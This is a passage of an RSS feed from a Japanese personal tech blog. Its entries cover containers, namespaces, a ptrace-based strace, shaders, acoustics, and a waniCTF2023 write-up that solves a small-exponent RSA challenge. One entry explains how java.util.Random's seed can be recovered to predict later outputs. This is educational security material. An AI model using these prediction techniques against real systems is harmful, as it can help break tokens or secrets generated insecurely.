サービスメッシュ サービスレベルの通信をサービスに制御させるのではなく，インフラで制御するようにする ログのフォーマットやタイムアウトなど統一させるべき機能が減る 言語の多様性に振り回されない サービスの前にプロキシコンテナを配置し，通信処理の役割を担わせる サービスのコンテナに付随するのでサイドカーコンテナともいわれる プロキシ側で認証や暗号化，出力の管理などをする 通信の保護：暗号化，認証，アクセス制御 耐障害性：ロードバランサ，サーキットブレーカー 監視：メトリクス，ログ，トレース収集 権限管理：コンテナの特権排除など 宣言型 API サービス同士を接続する API として使われるのが宣言型 API kubernetes が pod の数を自動制御するようなこと サービスがダウンしたときに自動的に回復したり，負荷が高まった時に自動的にノードを増やせる イミュータブルインフラストラクチャ インフラのアップデートに伴って動かなくなることはよくある アップデートが必要な場合は，アップデート後の OS を用いた環境を立ち上げて古い環境を破壊する 問題があった場合のロールバックも簡単 </description>
    </item>
    
    <item>
      <title>自作 strace</title>
      <link>http://side-realms.github.io/container/strace/</link>
      <pubDate>Wed, 30 Aug 2023 18:59:45 +0900</pubDate>
      
      <guid>http://side-realms.github.io/container/strace/</guid>
      <description>おすすめのガンプラ，随時募集しています
strace seccomp がよく分からなかったので監視系で strace を作ってみる
strace はプロセスが使ってるシステムコールとかの呼び出しをトレースできる
strace は ptrace(2) でプロセスを監視しており，これによって呼び出されるシステムコールや その引数を見ている．
第一引数で ptrace リクエストの内容（？），第二引数にプロセスの pid を指定する．
long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); 他プロセスをトレースするためには，対象のプロセスにアタッチし，一時的に親になる必要がある． ptrace が実行されると，トレーサーは，システムコールを呼び出したタイミングなどで 子プロセスに停止するよう命令し，カーネルは子プロセスを SIGTRAP で停止する．
strace を作る まずはアタッチ・デタッチの動きをみるだけ
int main(int argc, char *argv[]){ if(argc &amp;lt; 2){ fprintf(stderr, &amp;#34;pid needs\n&amp;#34;); exit(1); } pid_t pid = atoi(argv[1]); printf(&amp;#34;attach to PID: %d\n&amp;#34;, pid); long ret = ptrace(PTRACE_ATTACH, pid, NULL, NULL); if(ret&amp;lt;0){ perror(&amp;#34;atttach failed&amp;#34;); exit(1); } printf(&amp;#34;attached to %d\n&amp;#34;, pid); sleep(5); ret = ptrace(PTRACE_DETACH, pid, NULL, NULL); if(ret&amp;lt;0){ perror(&amp;#34;failed to detach&amp;#34;); exit(1); } printf(&amp;#34;detached from %d\n&amp;#34;, pid); return 0; } この状態で top コマンドを打ち，動きを見てみると sleep(5) の間，top コマンドの動きが止まっていることが分かる． これはさっき書いた「カーネルは子プロセスを SIGTRAP で停止する」の部分． ptrace されるプロセスは，シグナルごとにいちいち停止するので，waitpid で状態を確認する必要があるらしい．</description>
    </item>
    
    <item>
      <title>Namespace</title>
      <link>http://side-realms.github.io/container/namespace/</link>
      <pubDate>Wed, 30 Aug 2023 10:04:30 +0900</pubDate>
      
      <guid>http://side-realms.github.io/container/namespace/</guid>
      <description>モンエナ スイカ味，ほんとうにまずい
namespace namespace は，プロセスをグループ化して隔離空間を作り出すのに一役買っている． namaspace 大まかな機能があるわけではなく，隔離したいリソースごとに機能が分離している． (mount namespace, PID namespace とか)
OS 起動時にはデフォルトの namespace が存在し，全てのプロセスが属している． このうえで，そのリソースを隔離させたいかを指定してコンテナを作る．
unshare unshare &amp;ndash;mount とか unshare &amp;ndash;pid みたいな感じで namespace を作る． ネットワーク以外はこれで隔離できるらしい 各プロセスが動作している namespace に関する情報は /proc/[PID]/ns で見れる．
ここに表示されている数字が同じなら同じ namespace に属している． この /proc/[PID]/ns は，プロセスを既存の namespace で動かしたいときに使うこともある． setns は既存の namespace でプロセスを動かすことを実現するが(https://tenforward.hatenablog.com/entries/2014/08/14)，このときの引数にさっきの ns 指定される．
mount namespace ファイルシステムを特定のディレクトリに関連付けるための処理をマウントといい， マウントが行われるディレクトリをマウントポイントという． あるパーティション(例えば /dev/sdc1)にファイルシステムを作ってルートとしてマウントした場合， ルートがマウントポイントになる． この下に別のファイルシステムをマウントすることもできる．
mount namespace は，その namespace 内のプロセスから見えるマウントポイントを分離する． なので，ある mount namespace から別の mount namespace を見たときにそのマウントポイントが見えない． コンテナごとに独立したファイルシステムを使うことができる．
/root/hosts ファイルをバインドマウント先として /etc/hosts をマウントする． ファイルを確認すると同じ内容が見えることが分かる．</description>
    </item>
    
    <item>
      <title>コンテナ入門する</title>
      <link>http://side-realms.github.io/container/nyuumon/</link>
      <pubDate>Tue, 29 Aug 2023 19:51:30 +0900</pubDate>
      
      <guid>http://side-realms.github.io/container/nyuumon/</guid>
      <description>昆虫ロック弾けるようになりたい
コンテナ コンテナはプロセス自体は同じ OS で動いていて，これを OS のカーネル機能によって隔離する． 使えるリソースを分離して，ホスト OS で動くプロセスとか他のコンテナから独立した空間を作る． カーネルに「コンテナ」の仕組みがあるわけではなく，namespace とか cgroup みたいな いくつかのシステムを組み合わせてコンテナを作っている． なので Docker や LXC で作りが違う
メリット コンテナはプロセスなので起動速度はプロセスに近い VM と比較してエミュレートの必要がないためオーバーヘッドがすくない アプリケーションだけをコンテナ起動できる デメリット 異なる OS 用のバイナリは動かない 基本のカーネルは同じなのでカーネルの操作はできない 基本技術 CRI/OCI CRI: ユーザからの要求を受けてコンテナとの通信をする．イメージの取得や展開，ネットワークのセットアップなど．コンテナの直接の操作は低レイヤランタイムに命令を出す．containerd とか CRI-O. OCI: 高レイヤランタイムから命令を受けて，コンテナとして実行するプロセスをホストから分離して実行する．runc とか crun. レイヤ コンテナイメージはレイヤの集合体で，コンテナ実行時にこれらがマージされる．
layer:ルートファイルシステムのデータ .json:実行環境を再現するための情報 ファイルシステム コンテナ内とホストではファイルシステムを分離したいことが多い． このとき，ホスト内にあるディレクトリをコンテナの root ディレクトリにする．
chroot: プロセスのルートディレクトリを変更することができる． ただし jailbreak が可能なので chroot を使う場合はコンテナの chroot の capability を剥脱する必要があるが(CAP_SYS_CHROOT)，ユースケース的に不便なことも多いのでデフォルトでは剥奪しない． 代わりに pivot_root を使う
pivot_root: ルートファイルシステムを入れ替える． ファイルシステムごとに入れ替えるので，コンテナ側からは root のファイルシステムを見ることはできない． また，pivot_root には厳しい条件がある．</description>
    </item>
    
    <item>
      <title>Hugo移行した</title>
      <link>http://side-realms.github.io/other/hugo/</link>
      <pubDate>Tue, 29 Aug 2023 17:54:50 +0900</pubDate>
      
      <guid>http://side-realms.github.io/other/hugo/</guid>
      <description>自分のやったことを備忘録的に残すものがほしかった
theme が反映されない問題 手元で toml を更新して hugo server してもインポートした theme が全く反映されなかった． hugo するときの出力ディレクトリを docs に変更して，github pages の方でも以下のように変更する
setting -&amp;gt; pages -&amp;gt; root -&amp;gt; docs
theme の html を変更しても反映されない問題 使っている hugo のバージョンが対応していなかったっぽいのでダウングレードしたら反映するようになった
Github Action git push したときに勝手に更新してくれるようにしたい name: GitHub Pages on: push: branches: - main # Set a branch name to trigger deployment pull_request: jobs: deploy: runs-on: ubuntu-22.04 concurrency: group: ${{ github.workflow }}-${{ github.ref }} steps: - uses: actions/checkout@v3 with: submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .</description>
    </item>
    
    <item>
      <title>about</title>
      <link>http://side-realms.github.io/about/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/about/</guid>
      <description> like Budweiser ぽこピー おむらいす食堂 YMO dislike </description>
    </item>
    
    <item>
      <title>java が生成する乱数を予測する</title>
      <link>http://side-realms.github.io/other/java_crypto/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/other/java_crypto/</guid>
      <description>java が生成する17兆通りある乱数を予測してみる
1. 乱数生成をするスクリプトを書く ソース
2. java の乱数生成を調べる 「予測できるらしい」しかしらないのでちゃんと調べる
Random random = new Random(); random.nextInt(); この nextInt() はソースコード内で next() を呼び出していて，next() のソースコードは以下のようになる
protected synchronized int next(int bits) { seed = (seed * 0x5DEECE66DL + 0xBL) &amp;amp; ((1L &amp;lt;&amp;lt; 48) - 1); return (int) (seed &amp;gt;&amp;gt;&amp;gt; (48 - bits)); } このとき乱数は seed で返されるが，それ以外の値は全て既知． なので，ひとつ seed が分かればそれ以降の seed も知ることができる． 取り出す seed は必要な上位 bit 分を最後の演算で呼び出す． 例えば nextInt(32) で呼び出したとき，返ってくるのは 32 bit の乱数で，残りの 16 bit が未知ということになる． これくらいなら簡単に予測できる</description>
    </item>
    
    <item>
      <title>OpenCV と python で顔トラッキングする</title>
      <link>http://side-realms.github.io/other/tracking/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/other/tracking/</guid>
      <description>Vtuber みたいなことをできるようにしてみたい． 顔認識ができればいいのか？
単純なマッチング まずは単純に動画内を移動するアイコンをマッチングできるようにする. 動くプレミアムボールに対してトラッキングし，判定した場所に長方形を描く
ソース
顔認識 openCV で顔認識ができるらしい． 既存の学習セットがあったのでこれを食べさせればできる．(下記は photoAC の素材で顔判定をしたもの)
ソース
カメラで顔認識 opencv でデバイスを開くようにすれば同じように検証できるらしい． 顔をトラッキングし続けて，顔を認識したらバックベアードのイラストを出すようにした
ソース</description>
    </item>
    
    <item>
      <title>shader programming</title>
      <link>http://side-realms.github.io/other/shader-programming/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/other/shader-programming/</guid>
      <description>GLSL レンダリングにおいて，シェーダはパイプラインのひとつ．
頂点シェーダ：座標変換，陰影処理など． テッセレーションシェーダ：頂点シェーダから送られてきたポリゴンを分割する． ジオメトリシェーダ：ポリゴンに対して頂点の増減をする．増やすだけでなく，減らすこともできる ラスタライズ：頂点シェーダで決まった座標と色をもとに，ピクセル単位で描画情報を設定する．補間するかんじ？ ピクセルシェーダ：ラスタライズされたピクセル一つ一つに対して何らかの処理（何らかの処理って？）を行い，GPUに返す レンダーバックエンド：ピクセルシェーダが決定した情報の書き込みを判断する．いくつかのテストがあるらしい． GLSL はシェーダを担当するが，シェーダだけではパイプラインは成り立たないので， 全体を管理する必要がある． この全体を管理するのが OpenGL で，これを JavaScript から操作できるようにしたのが WebGL．
101 画面を赤く塗るだけのコード
#version 300 es precision highp float; out vec4 fragColor; void main(){ fragColor = vec4(1.0, 0.0, 0.0, 1.0); } 補間関数を使う
#version 300 es precision highp float; out vec4 fragColor; uniform vec2 u_resolution; void main(){ vec2 pos = gl_FragCoord.xy / u_resolution.xy; vec3[4] col3= vec3[]( vec3(1.0, 0.0, 0.0), vec3(0.0, 1.0, 0.0), vec3(0.0, 0.0, 1.0), vec3(1.</description>
    </item>
    
    <item>
      <title>treasure trove</title>
      <link>http://side-realms.github.io/treasure/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/treasure/</guid>
      <description>｢あ｣｢え｣｢お｣っていう奴 random.dog 柴犬がすき
Eclair De Lune 12:27 よくまとまっていてすごい．新しい曲を知りたいときに参照する
DON PA PPO / ガチ恋ぽんぽこ【MV】 ニセコイラジオ 一生聞いてた(る)
俺ガイル 助けてくれ</description>
    </item>
    
    <item>
      <title>waniCTF2023</title>
      <link>http://side-realms.github.io/writeup/wanictf2023/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/writeup/wanictf2023/</guid>
      <description>初心者~中級者の CTF ．個人参加．beginner は全解きしたいのきもちで挑んだが分かりやすい問題が多くて色んな技術にスムーズに入門することができた． これを機に CTF 入門していきたいきもち
waniCTF2023
official writeup
crypto EZDORSA_Lv1 ChatGPT に入れたらできた．すげえ～
EZDORSA_Lv2 e が小さいので RSA の運用的にまずい．RSA の暗号化において $C=M^e\mod N$ だが，ここで $e$ が小さいと $M^e$ も小さくなる． このとき $M &amp;lt; \sqrt[e]{N}$ なら，$M^e &amp;lt; N$ より $\mod N$が関係なくなる． すると $C=M^e$ になるので，$M = \sqrt[e]{C}$ でもとまる
import gmpy2 from Crypto.Util.number import * # 提供されたoutput.txtの内容 n = 25465155563758206895066841861765043433123515683929678836771513150236561026403556218533356199716126886534636140138011492220383199259698843686404371838391552265338889731646514381163372557117810929108511770402714925176885202763093259342499269455170147345039944516036024012941454077732406677284099700251496952610206410882558915139338028865987662513205888226312662854651278789627761068396974718364971326708407660719074895819282719926846208152543027213930660768288888225218585766787196064375064791353928495547610416240104448796600658154887110324794829898687050358437213471256328628898047810990674288648843902560125175884381 e = 7 c = 25698620825203955726406636922651025698352297732240406264195352419509234001004314759538513429877629840120788601561708588875481322614217122171252931383755532418804613411060596533561164202974971066750469395973334342059753025595923003869173026000225212644208274792300263293810627008900461621613776905408937385021630685411263655118479604274100095236252655616342234938221521847275384288728127863512191256713582669212904042760962348375314008470370142418921777238693948675063438713550567626953125 tmp = pow(5, 100, n) c = c // tmp print(tmp) print(c) m,result = gmpy2.</description>
    </item>
    
    <item>
      <title>YouTube を開くと叱ってくれるスクリプト</title>
      <link>http://side-realms.github.io/other/cortana/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/other/cortana/</guid>
      <description>YouTube 中毒なのでどうにかしたい
ソース
ウィンドウのステータスとか，マウスの位置みたいなパラメータは python では直接触ることができなくて， dll 経由で操作する必要がある． cdll の呼び出し規約は cdeclで， windll の呼び出し規約は stdcalなので， スタックを関数がクリーンアップするか，呼び出し元がするかに 注意する必要がある（たぶん） 今回は WindowsAPI なので stdcall
_get_running_window() で開いているウィンドウ(プロセス)の情報を取得する． 無限ループで回し続けて，「Youtube」が含まれる(表記ゆれふくむ)プロセスを見つけたら， mouse_move_close() でマウスを動かしてウィンドウを閉じる． 本来ならウィンドウを直接終了することもできるが，マウスの操作もしたいので今回はこれでいい
あとはトースト通知を出して，Cortana を呼び出しておしまい．Cortana 呼び出せるの知らなかったな</description>
    </item>
    
    <item>
      <title>フォルマント解析</title>
      <link>http://side-realms.github.io/sound/formants/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/formants/</guid>
      <description>フォルマント解析，やってみたいよな
フォルマント 人間の音声は声帯の振動で生成され，声道を通って発せられる． このとき，声道の周波数特性によって，特定の周波数が強調される． この強調された周波数をフォルマント周波数といい， 低いものから順番に第一フォルマント，第二フォルマント・・・という
下図は IA に「あいうえお」ってしゃべらせたときの波形
これはただの stft なのでフォルマントではなく基本周波数とその高調波のはずで，これを LPC 解析とかして 包絡線を求めることでどの周波数が強調されているかを知ることができる，という認識
原理は全くわかってないけどとりあえずやってみる
librosa 初めてちゃんと調べたけど便利だ あんまり正確じゃない気がするけどまあいいか
それっぽい周波数にそれっぽいピークがでているのでまあ．．．
formants.py
LPC 解析 音の複雑な形を線形の式で予測してしまおうというこころみ
時刻 n における信号を x_n と表すと，線形予測の結果は以下のようになる
$$ \overline{x_n} = -(\alpha_1 x_{n-1} + \alpha_2 x_{n-2} + &amp;hellip; + \alpha_p x_{n-p}) $$
真の値との誤差を計算すると以下のようになる．
$$ \epsilon_n = x_n - \overline{x_n} = x_n + \alpha_1 x_{n-1} + \alpha_2 x_{n-2} + &amp;hellip; + \alpha_p x_{n-p}$$
このときに誤差をなるべく小さくするようにパラメータを決めてあげる必要がある． α (線形予測係数)をうまく選んであげればいい，みたいな感じ
さっきの式から以下のように畳み込みを表せる．
$$\overline{x_n} = x_n - \epsilon_n = - \alpha_n * x_n$$</description>
    </item>
    
    <item>
      <title>レコード</title>
      <link>http://side-realms.github.io/sound/record/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/record/</guid>
      <description>レコードは音質が良いって聞くけどあんまり信用していない
レコードの仕組み レコード盤には音波を記録した溝が彫られているが， この溝をレコード針が動くことでカートリッジに振動が伝わる． この振動を電気信号に変換し，アンプで増幅することで音になる． まあこれはいいんだけど，ステレオ再生ができる理由が分かっていない．
従来のモノラル再生は針が左右に動くだけで振動をトレースしている． で，さらにステレオ再生するにはもう一つの情報が必要なので， 単に針を増やす方法が考えられた．しかしこれは同期や信号処理部の難しさなどで発展しなかった． 今使われているのは 45/45 方式というもので，レコードの溝の左右にそれぞれのステレオ音を保存する． こうすると溝に対して 45 度に振動するので，一本の針でステレオを保存できる．
針が音溝に触れて振動すると，針を持っているカンチレバーを通してコイルや磁石に伝えられる． このコイルが磁石の磁界の中で振動することで，電磁誘導が起き，コイルに電気信号が発生する． このときカートリッジに磁石が巻いてあるものを MM 型，コイルが巻いてあるものを MC 型と区別する．
MM, MC カートリッジは高周波であればあるほど電圧が高くなるので (高周波であるほど針の追従速度が速くなるため)， 速度比例型カードリッジと呼ばれる． それ以外にも，針の動きを光の変化として捉える光カートリッジとか． そもそも速度比例型カートリッジないでも音質に違いがあるらしいが， 実際に買って比較できるほどのお金はないのであきらめる．
そもそもレコードが音がいいと言われる理由はおそらくアナログ入力・出力だからだと思う． CD はデジタル変換してしまっているため，解像度(量子化・標本化の部分) であったり，20 Hz ~ 20 kHz のフィルタだったりで音質が悪いといわれる． レコードはこうしたデジタル変換をしていないから，ということで音質が良いと言われているらしい． でもそもそもマイクは 20 kHz までしか再生できないし， カートリッジやプレーヤーがその再生に対応しているのかという問題がある． だから個人的にはフィルタよりも解像度の問題だと思っている． そういうことなら，デジタル mix したレコード盤は音質の面で良さがないことになるが そういうことなんだろうか． 加えてレコードはその再生方法に起因するノイズが大きい(後述)． かなり物理的な再生方法なので回転ムラであったり振動に邪魔される． CD はこうした欠点がない(?)ため，ノイズ的な面では CD の方が音質が良い気もする． だからつまり CD もレコードも一長一短だし「音質が良い」みたいな， 普遍的なようで何にも指標が定まっていない形容詞で表現しないほうが健全だと思っている．
とはいってもレコードを所持したい気持ちはあるし あのデカいアートワークを見たときの嬉しさや，アナログ感のある再生システムとかは好き
レコードの種類 LP とか EP とか色々サイズに違いがある． LP 以外のレコード買ったことないけど SP とかシングルとかめちゃめちゃ種類あって驚いた</description>
    </item>
    
    <item>
      <title>両生爬虫類</title>
      <link>http://side-realms.github.io/sound/amphibian_reptile/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/amphibian_reptile/</guid>
      <description>カエル好きやねん
基本的な聴覚特性 基本的に両生爬虫類は低音側に感度をもつ． 具体的には 1 kHz 以下周辺芋高い感度を持つ． だからといって，超音波領域に感度がないわけではない． 例えば，渓流にすむカエルなどは，渓流ノイズを避けるために 高周波側でコミュニケーションをとるように進化した．
耳の形についても，両生爬虫類は耳介を持たないことで知られている． また，鼓膜をもつものも限られており，加えてほとんどのカメと一部のカエルなどは鼓膜が露出している． 哺乳類の耳小骨とは違い，両生爬虫類は1つの耳小骨と耳小柱しかもたない．
爬虫類は，耳小柱がいくつかに分岐し，複数の経路を鼓膜とつないでいる． また，両生類は鼓膜からの振動に加えて，前脚と上肩甲骨からの骨伝導が内耳へ伝達する． 他にも，一部のカメは水中からの音を反響増幅させるために中耳腔が大きくなっていたり， 一部のカエルは肺や口腔から反響する音を内耳から聞き取る種も存在する．
カエル カエルの鳴き声は主に繁殖期にお互いのコミュニケーションをとるために使われる． 例えばオスはトリル音で広告音を出すことで求愛の合図をし，メスはそれより遅いトリル音で解除音を出すことで求愛から逃れようとする． このクリック音は，例えばアフリカツノガエルの場合は，喉頭筋が収縮することによって発せられる． 喉頭筋は二対が粘着質の体液でくっついているが，これが互いにはがされるときに空気が破裂することで クリック音が鳴る． このクリック音が鳴嚢で増幅され，共鳴することで外界に放送される．
広告音
基本的な機能は，求愛によってメスを呼び寄せることと，オスを排斥することである． これはどちらかしかない場合も，両方の機能を持つ場合もある． 例えばメスが超音波を聞くことができない種のカエルは，オスを排斥する効果しかない． 解除音
他のオスから繁殖を求められたときや，排卵の準備ができていないときに発する． ほとんどの場合，これで放免される．平和だ なわばり
例えば他のオスへの攻撃開始の合図であったり，他のオスの広告音を遮る役割がある． メスは広告音が聞こえない場合はなわばり音に引き寄せられるらしい． 危難音
捕食者に捕まった時に発する音だが，危険の合図には役に立たないらしい． 捕食者を驚かせることしかないらしい．それでええんか こうした発声を見るとわかるように，カエルの発声はオス・メスに限った話ではない． さらに，繁殖の際に鳴くメスの種類も存在する． しかし，一般的にメスの発声はとても小さい．これは，オスのみが鳴嚢をもつためである． メスの求愛音声は，一般的にオスからの応答という形で発声するため， 広範囲に伝達する必要がないことが理由だと考えられている．
ところで，カエルといえばコーラスである． 一般的にコーラスはカエルの広告音である． カエルは基本的に鼓膜をもつので，周囲の音を聞きながらコーラスをすることができる． このコーラスは，個体同士がなるべく鳴き声の重複を抑えるように鳴く傾向にある． これは同種の個体がたくさんいる状態でも同じ現象が確認でき， 完全でなくとも，互いの広告音に混ざらないように互いの広告音をずらして鳴く傾向にある． これは，集団の中で個々のオスが自分の存在を知らせる役割や， オス同士がけん制(なわばり)する役割があるらしい．
カエルに限った話ではないが，低周波音ノイズに埋もれないことや， 盗聴を防ぐなどの役割から超音波を使ったコミュニケーションを使うことがある． また，音源定位などの問題もある． つまり，カエルなどは頭が小さく，両耳に届く音の音圧差などが測りにくい． しかし，超音波を使って音源定位をすることで，可聴音よりも精度をあげることができている． 先に話したクボミミニオイガエルは，超音波を用いてコミュニケーションをとる． 普段の聴覚は 5 &amp;ndash; 7 kHz にピークをもつが，耳管を閉じると なんと 10 &amp;ndash; 34 kHz にシフトする．すげー
ヤモリ ヤモリは鳴く． 多くのヤモリは声帯の振動を口腔で増幅することで音を発しているが， 例外的にスキンクヤモリはしっぽを使って音を出す． ヤモリはオスメス両方鳴き，その種類は2つである．</description>
    </item>
    
    <item>
      <title>人間の音声</title>
      <link>http://side-realms.github.io/sound/voice/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/voice/</guid>
      <description>人間の発声 声を出そうとすると，左右の声帯が中央に寄る． 同時に肺からの呼気が声門を通り抜けると，狭くなった声帯を呼気が通り抜けて口に流れる 呼気が狭いところを流れると，広いところを流れる時より圧力が高くなるので(ベルヌーイの法則)，声門が一時的に閉じる． でも呼気は出続けるので，圧力に負けて声門がもう一度開く また同じようにして閉じる，開くを繰り返すので，声門から出力される空気の密度に濃淡ができる 濃淡が音波の縦波として伝わる 周波数は声門が開閉する回数，振幅は声門の開き幅，音色は声門の性質(どれくらい上手に開閉できるかとか，口腔や咽頭の形・容積とか)に対応している．
音響特性(あかさたな，とかの違い)は音色に対応している，口腔の形とか 鼻腔との接続があって母音・子音がつくられる． 生後すぐには構音はできず，喃語を通して発声器官を制御できるようになる．
しかし口腔や鼻腔に損傷があると発声障害になる．歯や感覚異常も同様． また，脳はもちろん，難聴も発声に影響する．つまり，自分の声をモニタリングできないので フィードバック制御ができなくなる．
ロンバード効果：自信が発した音声を雑音とともにフィードバック情報として得ているが，周囲の雑音が大きいと SNR が悪くなるので，自分の声を大きく・高くしようとする．車掌さんの声が高い理由はこれらしい．
delayed auditory feedback：自信の声にディレイをかけてフィードバックさせると，精神的ストレスになる．発声とフィードバックの異常がある吃音の治療に使われているらしい
人間の聴覚 耳介が集音し，鼓膜を振動させる
鼓膜にはツチ骨・キヌタ骨・アブミ骨(耳小骨)が付着していて，鼓膜とこれら耳小骨の底面積比とてこの原理によって振動が増幅されて内耳(蝸牛)に入力される．
蝸牛の入り口である卵円窓はアブミ骨と固着していて，アブミ骨が振動すると内部のリンパ液が振動する
リンパ液が振動し，基底膜にその振動が伝わる．
基底膜に付着している有毛細胞が振動すると，その振動が神経に電気信号として伝わる．
この有毛細胞は周波数特性があり，蝸牛の手前にあるほど高い周波数に対応している 加齢によって手前の細胞ほど反応しなくなり，高周波が聞こえづらくなる． 蝸牛は三層に分かれていて，上から「前庭階」「中心階」「鼓膜階」という．上下二層は細胞外液とだいたいおなじイオン組成になっているが，中央一層は独立してカリウムイオンに富んでいて(内リンパ液)，外リンパ液よりも +80 mV くらい高電位になっている．(なんで？)
中心階の基底膜に付着している有毛細胞は，感覚毛がある上部分だけを内リンパ液に浸していて，有毛細胞が振動すると感覚毛が開口する．すると内リンパ液の K+ は有毛細胞に流入し，発火する．これによって物理信号が電気信号に変換される．
伝音性難聴：空気振動が十分に伝わらないと当然難聴になる．耳小骨の異常や中耳の炎症など
感音性難聴：内耳に損傷がある場合，音がひずんだり，響いたりする．人工内耳を使う必要がある場合もある．人工内耳は，マイクとその電気信号を直接電極として内耳に挿入する．これによって直接発火させる．ただ，もともとの内耳の周波数分解能は 3500 個なのに対し，人工内耳は 20 個程度で，劣っている．しかし，適切なリハビリテーションを行うと電話での会話すらそん色なくできるようになるらしい．
ピッチ感覚 メル尺度：人間からみた音の聞こえに基づいた尺度で，1000 Hz が 1000 mel と決められている． この二倍に聞こえる音は 2000 mel だが，これが 2000 Hz とは限らない． また，音量が上昇すると周波数の低い音はより低く，高い音はより高く聞こえる． 昔の電子オルガンは倍音の少ない音がピッチがずれたように聞こえるらしい． また，これと関連して短音では音の高さが明確でなくなる． トーンピッチは純音として得られる音の高さの近くだが，クリックピッチ(2~15 msec) は純音としては知覚されないが，高低の判断は可能
絶対音感：音を聞いてその音の高さを判断することができる能力のこと． 相対音感は，2音間のピッチ関係を当てることができるが，絶対音感はその一音だけで半音まで特定できる． つまり音楽的なピッチクロマに対する判断能力のこと．
言語と音響特性 人間とサルは，同じ母音・子音を発することができる身体的構造を持ちながら，サルはそのような現象はない． これは，それを制御する神経基盤の違いが影響しているといわれている． さらに，表情にも変化があり，サルは唇を振動させるリップスマッキングという表情をもつが， これは人間が発話をする際の周波数と一致しており， この神経運動やその基盤が同窓でありながら別々の機能を獲得しているという進化史がある． また，人間の声帯は，もともとは気道に物が入らないような弁の役割をしていたが， これと呼気を利用して発話が副産物として生まれたという歴史がある． このように発話とは無相関な原因が発話的な能力を促進(差別化)しているらしい．</description>
    </item>
    
    <item>
      <title>分子</title>
      <link>http://side-realms.github.io/sound/molecule/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/molecule/</guid>
      <description>可聴化 可聴化という分野があるらしい． 視覚的に得られる情報よりも聴覚的に得られる情報の方が意味をもつことがある，みたいな考えがあるらしい． 機械の異音をベテランが察知するみたいなかんじだろうか． たしかに聴覚はいろんな情報を一度に受容できる，みたいな話は聞いたことがある． 視覚と比べてインテグラルに情報を得ることができる，という意味だと思うが， 得たい情報によって話が変わるような気もする．
ガイガーカウンタはこうした可聴化の試みの一つ． ガイガーカウンタは放射線物質が崩壊するときに飛んでくる粒子や電磁波の個数をカウントするもの． 高い電圧が印加されたガスに放射線が通過するとガスが電離するので，それによって生じた電子で放射線量を 測定する． このとき通過した放射線量をパルスの音に変化すれば，音の粗密で放射線量を 聴覚的に知ることができる． エネルギーとはまた別で，単に個数を数えている． 他にもヒッグス粒子の出現と配置を音に変換したものも存在するらしい． (soundcloud)
どうやって変換するのか，みたいな変形部分の考え方で色々議論があるらしい． 今回の分子の音も可聴化に関すること
分子の可聴化 基本的に，分子などの固有の振動スペクトルを，人間の可聴領域に転置するという方法でやる． 分子の振動はナノメートルの単位で振動しているが，これを耳に聞こえる範囲でどう可聴化するか， という部分が問題になる． 読んだ本では振動スペクトルを鍵盤の 88 鍵に割り当てていた． あとは聴かないとわからないので，可聴化のプロファイルよりは分子のどの部分に差が出るのか， みたいなことを見ていく
ところでこういう可聴化の音楽ってカリビアンな感じのが多い気がするんだけどなんか理由があるんだろうか．
血液型 血液型は ABO 型が見つかってからいくつも見つかっているが，まだこの ABO 型がよく知られている． 血液型の違いは，赤血球の表面から出ている糖鎖の構造の違いで分類されている． 糖鎖にある接合部にA遺伝子がくっつくか，B遺伝子がくっつけば，それぞれA型・B型になる． 両方くっつけばAB型，両方くっつかなければO型になる． この結合(スフィンゴ糖脂質というらしい)に差異があらわれる．
(参考)
アミノ酸 そもそもタンパク質はアミノ酸が多重結合したもので， 中心の炭素にカルボキシ基(COO-), アミノ基(HH3+) が結合し， いろんな側鎖が結合して違いが生まれる．
いろんなアミノ酸があるが，人間に必要な必須アミノ酸(9つ)は体内で生成されない． 体内にはタンパク質を構成しているアミノ酸の他に細胞や血液に蓄えられた 遊離アミノ酸というものがある． これはタンパク質の製造にアミノ酸が足りないときに無理やり引っ張ってこられるアミノ酸であるが， クオリティが低いのでいろんな不調につながる．へえ～～～～～～～～～～～～
(参考)
アラニン アラニンは筋肉とかアサリっていう印象がある． 酒を飲むとアルコールが摂取されるわけだが，これは肝臓で分解される． アルコールが脱水されるとアセトアルデヒドになり，これがさらに酢酸， 酢酸がさらに炭酸ガスと水に分解される，という順番． このアセトアルデヒドが二日酔いになるらしいが，これの分解を促進するのがアラニンというものらしい．
細胞の死に方 細胞は死ぬが，これには二種類ある． アポトーシスとネクローシスというふうに言われている． ネクローシスは化学的に細胞が死ぬことで，外部的な要因が大きい． 一方で，アポトーシスは，細胞にプログラムされた細胞死のことである． このアポトーシスは，最終的にマクロファージに食べられることで達成されるが， このためにはマクロファージにシグナルを出して気付いてもらう必要がある． このシグナルを伝達するのが Raf や Ras というものらしい． 例えばがん細胞が死ぬのもアポトーシスだし，胎児の指が発生するのもこのアポトーシスによる (胎児は指がくっついているが，アポトーシスによって指の間の細胞が死に，指ができる)．</description>
    </item>
    
    <item>
      <title>哺乳類</title>
      <link>http://side-realms.github.io/sound/bat/</link>
      <pubDate>Mon, 28 Aug 2023 17:57:25 +0900</pubDate>
      
      <guid>http://side-realms.github.io/sound/bat/</guid>
